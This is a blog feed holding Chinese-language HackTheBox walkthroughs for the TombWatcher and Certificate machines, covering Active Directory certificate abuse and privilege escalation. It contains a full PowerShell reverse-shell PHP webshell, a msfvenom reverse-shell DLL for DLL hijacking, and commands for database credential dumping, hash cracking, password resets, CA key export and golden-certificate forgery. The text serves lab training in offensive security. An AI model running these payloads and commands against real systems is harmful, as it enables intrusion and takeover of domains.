[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20250608182737_Certipy.txt'
[*] Wrote text output to '20250608182737_Certipy.txt'
[*] Saving JSON output to '20250608182737_Certipy.json'
[*] Wrote JSON output to '20250608182737_Certipy.json'
```

检测到 `ESC15`

```bash
➜  TombWatcher cat 20250608182737_Certipy.txt  
Certificate Authorities                    
  0                                        
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment          
      HTTP                                                                                                        
        Enabled                         : False                                                                   
      HTTPS                                                                                                       
        Enabled                         : False
    User Specified SAN                  : Disabled                                                                
    Request Disposition                 : Issue                                                                   
    Enforce Encryption for Requests     : Enabled                                                                 
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions                                                                                                   
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights                                                                                               
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins    
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins                 
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users      
Certificate Templates
  0
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
```

![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image12.png)

## ESC 15

> https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu
> 

```bash
➜  TombWatcher certipy-ad req \
    -u 'CERT_ADMIN' -p 'Password123!' \
    -dc-ip '10.10.11.72' -target 'DC01.tombwatcher.htb' \
    -ca 'tombwatcher-CA-1' -template 'WebServer' \
    -upn 'administrator@tombwatcher.htb' \
    -application-policies 'Client Authentication'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 33
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@tombwatcher.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

```bash
➜  TombWatcher certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@tombwatcher.htb'
[*] Connecting to 'ldaps://10.10.11.72:636'
[*] Authenticated to '10.10.11.72' as: 'u:TOMBWATCHER\\Administrator'
Type help for list of commands

# whoami
u:TOMBWATCHER\Administrator
```

我直接把 `henry` 加入管理员组和远程组

```bash
# add_user_to_group henry "Domain Admins"
Adding user: Henry to group Domain Admins result: OK

# add_user_to_group henry "REMOTE MANAGEMENT USERS"
Adding user: Henry to group Remote Management Users result: OK
```

使用 `evil-winrm` 登录并读取 `root.txt`

```bash
*Evil-WinRM* PS C:\Users\administrator\desktop> type root.txt
6d2352d2fcafb6b19e95e737b046864c
```

## 总结

一波下来直接梭哈，这次没有卡住的地方

但是我打完后发现，我`BloodHound`收集信息的时候，机器已经是被人修改过的了

正常来说我是不能直接在`BloodHound`中发现`CERT_ADMIN`用户的，因为它是已经被删除的用户，我需要对其进行恢复，再进行后续操作

```bash
# Enum isDeleted ADObject
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects
```

![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image13.png)

```bash
# 恢复账号
Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
# 激活账号
Enable-ADAccount -Identity cert_admin
```

然后才可以是用`BloodAD`进行修改密码，这里相当于给我降难度了

```bash
(Get-Acl "AD:CN=john,CN=Users,DC=tombwatcher,DC=htb").Access
```]]></content:encoded>
            <category>靶机</category>
            <category>HackTheBox</category>
            <category>Windows</category>
            <category>ADCS</category>
            <category>ESC15</category>
            <category>Kerberoasting</category>
        </item>
        <item>
            <title><![CDATA[HackTheBox - Machine - Certificate]]></title>
            <link>https://www.sunsetaction.top/2025/10/13/HackTheBoxSeason8 - Certificate</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/10/13/HackTheBoxSeason8 - Certificate</guid>
            <pubDate>Mon, 02 Jun 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Season8 Certificate https://app.hackthebox.com/machines/Certificate | Windows | Hard 前期踩点 刚刚尝试了SMB无法使用匿名账户进行访问，因为还扫描到了80端口，所以从Web下手 Web 访问 HTTP 并采集指纹 ...]]></description>
            <content:encoded><![CDATA[
# Season8 - Certificate

> https://app.hackthebox.com/machines/Certificate | `Windows` | `Hard`
> 

## 前期踩点

```bash
➜  Certificate nmap -sT -min-rate 5000 10.10.11.71             
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-01 21:18 CST
Nmap scan report for 10.10.11.71
Host is up (0.050s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  wsman
```

```bash
➜  Certificate nmap -sT -A -p 80,135,139,445,636,389 10.10.11.71
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-01 21:19 CST
Nmap scan report for 10.10.11.71
Host is up (0.076s latency).

PORT    STATE SERVICE       VERSION
80/tcp  open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
|_http-title: Did not follow redirect to http://certificate.htb/
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-01T20:59:35+00:00; +7h38m38s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
445/tcp open  microsoft-ds?
636/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-01T20:59:36+00:00; +7h38m37s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Hosts: certificate.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-06-01T20:58:58
|_  start_date: N/A
|_clock-skew: mean: 7h38m37s, deviation: 0s, median: 7h38m37s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

TRACEROUTE (using proto 1/icmp)
HOP RTT      ADDRESS
1   85.58 ms 10.10.16.1
2   87.46 ms 10.10.11.71

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.74 seconds
```

刚刚尝试了`SMB`无法使用匿名账户进行访问，因为还扫描到了`80`端口，所以从`Web`下手

## Web

访问 `HTTP` 并采集指纹

![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image.png)

其中还有登录页和注册页

![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image1.png)

创建了一个账户 `sunset` 并使用账户进行登录，并且用户类型有`student`和`teacher`，没有发现什么登陆之后才有的功能，教师用户登录不进去

扫描一下网站目录

```bash
➜  Certificate dirsearch -u http://certificate.htb/ -e php,txt,zip -x 403,404,503
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, txt, zip | HTTP method: GET | Threads: 25 | Wordlist size: 10439

Output File: /root/Desktop/HackTheBox/Certificate/reports/http_certificate.htb/__25-06-01_21-34-42.txt

Target: http://certificate.htb/

[21:34:42] Starting: 
[21:34:50] 200 -   14KB - /about.php
[21:35:01] 500 -  638B  - /cgi-bin/printenv.pl
[21:35:05] 200 -    0B  - /db.php
[21:35:09] 200 -    3KB - /footer.php
[21:35:10] 200 -    2KB - /header.php
[21:35:15] 200 -    9KB - /login.php
[21:35:15] 302 -    0B  - /logout.php  ->  login.php
[21:35:25] 200 -   11KB - /register.php
[21:35:30] 301 -  343B  - /static  ->  http://certificate.htb/static/
[21:35:30] 301 -  345B  - /static..  ->  http://certificate.htb/static../
[21:35:34] 302 -    0B  - /upload.php  ->  login.php

Task Completed
```

扫描出来 `upload.php` 访问一下，貌似缺少参数

![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image2.png)

最后在 `course` 中可以找到上传页面

![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image3.png)

该处可能存在文件上传漏洞

### 文件上传利用 & ZipSlip? & **ZIP Concatenation?**

上传页面中提示：

- Please select the assignment file you want to upload (the file will be reviewed by the course instructor)
    
    请选择您要上传的作业文件（该文件将由课程讲师审核）
    
- We accept only the following file types: `.pdf` `.docx` `.pptx` `.xlsx`
    
    我们只接受以下文件类型：`.pdf` `.docx` `.pptx` `.xlsx`
    
- You include the assignment file in .zip archive file to reduce it's size
    
    将任务文件包含在存档文件中`.zip`以减小其大小
    

经过测试，可以直接上传`PDF`文件，并且会检查文件头。也可以将`pdf`以`zip`格式压缩，然后上传（这里不能使用`bindzip`），上传`zip`文件之后会自动进行解压。

这里对上传功能点进行了常规的测试，例如修改文件后缀名等等，但是无法成功。

通过网络搜索，发现还可能存在 `ZipSlip` 漏洞

> https://medium.com/@ibm_ptc_security/zip-slip-attack-e3e63a13413f
> 

能达到`RCE`的效果，可以覆盖 `/etc/passwd` 文件或者公钥文件或者其他文件

> 一些利用了`ZipSlip`的CTF：https://starlox.medium.com/cyberspace2024-zipzone-ctf-zipslip-vulnerability-00489669feec
> 

我这里尝试了

```bash
➜  Certificate tree zip 
zip
├── 1.pdf
└── evil
    └── test.php

➜  Certificate zip 2.zip zip/*
  adding: zip/1.pdf (deflated 7%)
  adding: zip/evil/ (stored 0%)
```

然后上传`2.zip` ，但是页面不回显，无法得到上传后的文件夹路径

> 别人分享的一个链接：https://perception-point.io/blog/evasive-concatenated-zip-trojan-targets-windows-users/，其中的 **Chained Archives Explained: Concatenated ZIPs** 可能对我们有效
> 

```bash
➜  Certificate ls               
1.pdf  evil

➜  Certificate ls evil   
test.php

➜  Certificate zip -r 1.zip evil
  adding: evil/ (stored 0%)
  adding: evil/test.php (stored 0%)
  
➜  Certificate zip 2.zip 1.pdf  
  adding: 1.pdf (deflated 7%)
  
➜  Certificate cat 1.zip 2.zip > 3.zip  （无法上传）

➜  Certificate cat 2.zip 1.zip > 3.zip  （成功上传）
```

点击访问，并输入 `evil/test.php` 成功执行！！

![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image4.png)

上传一句话木马

```bash
<?php shell_exec("powershell -nop -w hidden -c \"\$client = New-Object System.Net.Sockets.TCPClient('10.10.16.43',4444); \$stream = \$client.GetStream(); [byte[]]\$bytes = 0..65535|%{0}; while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){; \$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0,\$i); \$sendback = (iex \$data 2>&1 | Out-String ); \$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> '; \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2); \$stream.Write(\$sendbyte,0,\$sendbyte.Length); \$stream.Flush()}; \$client.Close()\"");?>
```

PS：这里假如断开了，下次再连接是使用新的端口接收 shell

```bash
malicious_files/shell.php
```

![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image5.png)

## Mysql Dump

我们扫描目录的时候能看到存在`db.php` ,我们将其读取

```bash
<?php
// Database connection using PDO
try {
    $dsn = 'mysql:host=localhost;dbname=Certificate_WEBAPP_DB;charset=utf8mb4';
    $db_user = 'certificate_webapp_user'; // Change to your DB username
    $db_passwd = 'cert!f!c@teDBPWD'; // Change to your DB password
    $options = [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    ];
    $pdo = new PDO($dsn, $db_user, $db_passwd, $options);
} catch (PDOException $e) {
    die('Database connection failed: ' . $e->getMessage());
}
?>
```

读取数据库的数据

```bash
PS C:\xampp\mysql\bin> & "C:\xampp\mysql\bin\mysql.exe" -u certificate_webapp_user -p"cert!f!c@teDBPWD" -D Certificate_WEBAPP_DB -e "show tables;"
Tables_in_certificate_webapp_db
course_sessions
courses
users
users_courses
```

```bash
PS C:\xampp\mysql\bin> & "C:\xampp\mysql\bin\mysql.exe" -u certificate_webapp_user -p"cert!f!c@teDBPWD" -D Certificate_WEBAPP_DB -e "select * from users;"
id      first_name      last_name       username        email   password        created_at      role    is_active
1       Lorra   Armessa Lorra.AAA       lorra.aaa@certificate.htb       $2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG    2024-12-23 12:43:10     teacher 1
6       Sara    Laracrof        Sara1200        sara1200@gmail.com      $2y$04$pgTOAkSnYMQoILmL6MRXLOOfFlZUPR4lAD2kvWZj.i/dyvXNSqCkK    2024-12-23 12:47:11     teacher 1
7       John    Wood    Johney  johny009@mail.com       $2y$04$VaUEcSd6p5NnpgwnHyh8zey13zo/hL7jfQd9U.PGyEW3yqBf.IxRq    2024-12-23 13:18:18     student 1
8       Havok   Watterson       havokww havokww@hotmail.com     $2y$04$XSXoFSfcMoS5Zp8ojTeUSOj6ENEun6oWM93mvRQgvaBufba5I5nti    2024-12-24 09:08:04     teacher 1
9       Steven  Roman   stev    steven@yahoo.com        $2y$04$6FHP.7xTHRGYRI9kRIo7deUHz0LX.vx2ixwv0cOW6TDtRGgOhRFX2    2024-12-24 12:05:05     student 1
10      Sara    Brawn   sara.b  sara.b@certificate.htb  $2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6    2024-12-25 21:31:26     admin   1
12      sunset  sunset  sunset  1@q.xom $2y$04$46hjL/TUPqsT3KI7R/6tje1JOSy5.riL8ABfus1G8WZujELAgnQvy    2025-06-01 16:49:22     student 1
13      r       r       admin   t@t.com $2y$04$ui6Qc/eaGGRKK2ovA4iJne7qbd1uSkm5lVbEHnPWWKYYwzb2s0hY2    2025-06-01 16:49:28     student 1
14      sunset2 sunset2 sunset2 1@qq.com        $2y$04$F5Rr9QzbhhaEh7QhJKKwz.ClZdVaA9QPI9RBdy8v.G/Pc7TDAO196    2025-06-01 16:57:14     student 1
16      admin123        admin123        admin123        admin123@gmail.com      $2y$04$ViY8NzbVBvUlwppQcDrld.mh.1XcGQkc4lt6j5Uhj7IPyGq4Z0hQu    2025-06-01 16:59:02     student 1
17      Admin   Admin   adminsucks      admin@gmail.com $2y$04$FMa5TpAFpTDu5EwgVzybnuAJFryR18dzfSqZGLQFzHhqj/BwksTdy    2025-06-01 17:12:43     student 1
18      admin   adnim   adminadnim      admin@adnim.com $2y$04$x.Ak4KXkM.MLNA0JgCEPxevbFuBioVs5NONlqrw.eO2js1/5AQh8i    2025-06-01 17:14:15     teacher 0
19      1       2       3       test@test.com   $2y$04$dFR.yVKC/u9UwlPsyxa5fO11vPvZnFUhRxi2Uf25SoGQRaTE6SmBW    2025-06-01 17:16:12     teacher 0
20      test2   test2   test2   test2@test.com  $2y$04$Ci4wfETizE9WCrUgpC4tyuI7s4oLIpK/DWb/uhjO2IKTRIfD9JUGy    2025-06-01 17:17:40     teacher 0
22      test3   test3   test3   test3@test.com  $2y$04$m51Lz73GtqPoAzovxJeCM.B8/SAkDERIl7OBZfxAAQahNpiVFPsKe    2025-06-01 17:34:30     student 1
```

![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image6.png)

其中我们感兴趣的用户有两条

```bash
10      Sara    Brawn   sara.b  sara.b@certificate.htb  $2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6    2024-12-25 21:31:26     admin   1
1       Lorra   Armessa Lorra.AAA       lorra.aaa@certificate.htb       $2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG    2024-12-23 12:43:10     teacher 1
```

对密码进行爆破

```bash
➜  Certificate john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash  
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 16 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Blink182         (?)   
```

爆破了好一会将`sara.b` 的密码爆破出来了

测试用户有效性

```bash
➜  Certificate nxc smb 10.10.11.71 -u sara.b -p Blink182 -d certificate.htb
SMB         10.10.11.71     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certificate.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.71     445    DC01             [+] certificate.htb\sara.b:Blink182
```

## 域分析

`bloodhound-python` 搜集信息

```bash
➜  Certificate bloodhound-python -u 'sara.b' -p 'Blink182' -d 'certificate.htb' -ns 10.10.11.71 --zip -c All -dc 'DC01.certificate.HTB'
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: certificate.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: DC01.certificate.HTB
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 3 computers
INFO: Connecting to LDAP server: DC01.certificate.HTB
INFO: Found 19 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: WS-05.certificate.htb
INFO: Querying computer: WS-01.certificate.htb
INFO: Done in 00M 20S
INFO: Compressing output into 20250602223438_bloodhound.zip
```

发现用户 `sara.b` 是属于 `REMOTE MANAGEMENT USERS`组的

![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image7.png)

并且是 `Account Operators`组的用户

![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image8.png)

那就是可以更改用户的密码、创建用户组等，但是不能直接修改 `admins` 组用户的密码

查看一下 `Domain Admins` 组，只有 `administrator` 用户一个，故无法直接获得域权限

![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image9.png)

先使用 `sara.b` 登录到 `DC` 进行信息收集

```bash
➜  Certificate evil-winrm -i 10.10.11.71 -u 'sara.b' -p 'Blink182' 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Sara.B\Documents> 
```

查看`users` 文件夹，有好几个用户，先做好打算横向到哪一个用户

```bash
*Evil-WinRM* PS C:\Users> ls

    Directory: C:\Users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       12/30/2024   8:33 PM                Administrator
d-----       11/23/2024   6:59 PM                akeder.kh
d-----        11/4/2024  12:55 AM                Lion.SK
d-r---        11/3/2024   1:05 AM                Public
d-----        11/3/2024   7:26 PM                Ryan.K
d-----         6/2/2025   8:17 AM                saad.m
d-----       11/26/2024   4:12 PM                Sara.B
d-----       12/29/2024   5:30 PM                xamppuser
```

其中最令人感兴趣的是 `LION.SK` 和 `RYAN.K`

`LION.SK` 属于`DOMAIN CRA MANAGERS` 该组解释是：该安全组的成员负责为域用户发行和撤销多个证书

![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image10.png)

`RYAN.K` 属于 `DOMAIN STORAGE MANAGERS` 改组解释是：该安全组的成员负责量级任务，例如维护，碎片部和管理分区和磁盘

![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image11.png)

查看一下俩用户权限

更改用户`LION.SK` 的密码

```bash
➜  Certificate bloodyAD -d certificate.htb -u 'sara.b' -p 'Blink182' --dc-ip 10.10.11.71 set password LION.SK 'Password123!!!'
[+] Password changed successfully!
```

在 `LION.SK` 用户家目录中能得到 `user.txt`

```bash
*Evil-WinRM* PS C:\Users\Lion.SK\Desktop> type user.txt
4c634600c2be9138b12e74ac6f288176
```

枚举用户权限

```bash
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

更改用户`RYAN.K` 的密码

```bash
➜  Certificate bloodyAD -d certificate.htb -u 'sara.b' -p 'Blink182' --dc-ip 10.10.11.71 set password RYAN.K 'Password123!!!'
[+] Password changed successfully!
```

```bash
➜  Certificate evil-winrm -i 10.10.11.71 -u 'RYAN.K' -p 'Password123!!!'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> 
```

发现 `RYAN.K` 用户有 `SeManageVolumePrivilege` 权限

```bash
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                      State
============================= ================================ =======
SeMachineAccountPrivilege     Add workstations to domain       Enabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set   Enabled
```

## SeManageVolumePrivilege 滥用

> 找到一些利用文档和POC：https://github.com/CsEnox/SeManageVolumeExploit | https://cn-sec.com/archives/3100947.html
> 

改权限大致是让我们能拥有写入 `C` 盘的权限

```bash
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> echo '1' > ../../../1.txt
Access to the path 'C:\1.txt' is denied.
At line:1 char:1
+ echo '1' > ../../../1.txt
+ ~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OpenError: (:) [Out-File], UnauthorizedAccessException
    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand
```

```bash
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> upload SeManageVolumeExploit.exe
                                        
Info: Uploading /root/Desktop/HackTheBox/Certificate/SeManageVolumeExploit.exe to C:\Users\Ryan.K\Documents\SeManageVolumeExploit.exe
                                        
Data: 16384 bytes of 16384 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> ./SeManageVolumeExploit.exe
Entries changed: 859

DONE
```

成功写入 `C` 盘

```bash
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> echo '1' > ../../../1.txt
```

### DLL hijack？

`POC`链接中的`DLL`劫持无法使用，因为没有存在 `spool` 文件夹

```bash
*Evil-WinRM* PS C:\windows\system32> cmd /c dir | findstr spoo
11/26/2024  07:02 PM            93,184 spoolss.dll
11/26/2024  07:03 PM           564,224 winspool.drv
```

但是可以劫持别的`DLL` 

> https://github.com/xct/SeManageVolumeAbuse
> 

这里有别的`DLL`劫持方法，同时系统也存在该`DLL`

```bash
*Evil-WinRM* PS C:\windows\system32\wbem> cmd /c dir | findstr tzres
06/02/2025  09:33 AM             9,216 tzres.dll
```

```bash
➜  Certificate msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.45 LPORT=1234 -f dll -o tzres.dll 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 9216 bytes
Saved as: tzres.dll
```

但是最后 `systeminfo` `Access is denied`

```bash
*Evil-WinRM* PS C:\windows\system32\wbem> systeminfo
Program 'systeminfo.exe' failed to run: Access is deniedAt line:1 char:1
+ systeminfo
+ ~~~~~~~~~~.
At line:1 char:1
+ systeminfo
+ ~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
```

### CA.pfx

佬们给出了另外一个方案，拥有`SeManageVolumePrivilege` 权限后可以通过`certuil` 来导出证书

枚举`CA`

```bash
➜  Certificate certipy-ad find -u sara.b -p 'Blink182' -dc-ip 10.10.11.71 -text
```

![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image12.png)

导出`CA`的证书

```bash
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> certutil -exportPFX my "Certificate-LTD-CA" C:\Users\Public\ca.pfx
my "Personal"
================ Certificate 2 ================
Serial Number: 75b2f4bbf31f108945147b466131bdca
Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 3:55 PM
 NotAfter: 11/3/2034 4:05 PM
Subject: CN=Certificate-LTD-CA, DC=certificate, DC=htb
Certificate Template Name (Certificate Type): CA
CA Version: V0.0
Signature matches Public Key
Root Certificate: Subject matches Issuer
Template: CA, Root Certification Authority
Cert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8
  Key Container = Certificate-LTD-CA
  Unique container name: 26b68cbdfcd6f5e467996e3f3810f3ca_7989b711-2e3f-4107-9aae-fb8df2e3b958
  Provider = Microsoft Software Key Storage Provider
Signature test passed
Enter new password for output file C:\Users\Public\ca.pfx:
Enter new password:
Confirm new password:
CertUtil: -exportPFX command completed successfully.
```

```bash
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> download ../../Public/ca.pfx
                                        
Info: Downloading C:\Users\Ryan.K\Documents\../../Public/ca.pfx to ca.pfx
                                        
Info: Download successful!
```

- CertUtil 会打开“my”证书存储（Personal/My），找到**主题名称 (Subject Name / Issued To)** 或**友好名称 (Friendly Name)**为“`Certificate-LTD-CA`”的那张证书
- 然后把这张证书及其私钥（以及可能的证书链）打包成一个 PFX 文件
- 最终会在 `C:\Users\Public\ca.pfx` 位置生成一个二进制的 PFX 文件

### Golden certificate

拿到 `ca.pfx` 的证书公私钥后可以进行黄金证书（Golden certificate）攻击

> https://www.thehacker.recipes/ad/persistence/adcs/golden-certificate
> 

伪造`administrator` 的证书

```bash
➜  Certificate certipy-ad forge -ca-pfx ca.pfx -upn administrator@certificate.htb -subject 'CN=Administrator,CN=Users,DC=certificate,DC=htb' -out administrator_forge.pfx
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Saving forged certificate and private key to 'administrator_forge.pfx'
[*] Wrote forged certificate and private key to 'administrator_forge.pfx'
```

使用证书获取`TGT`

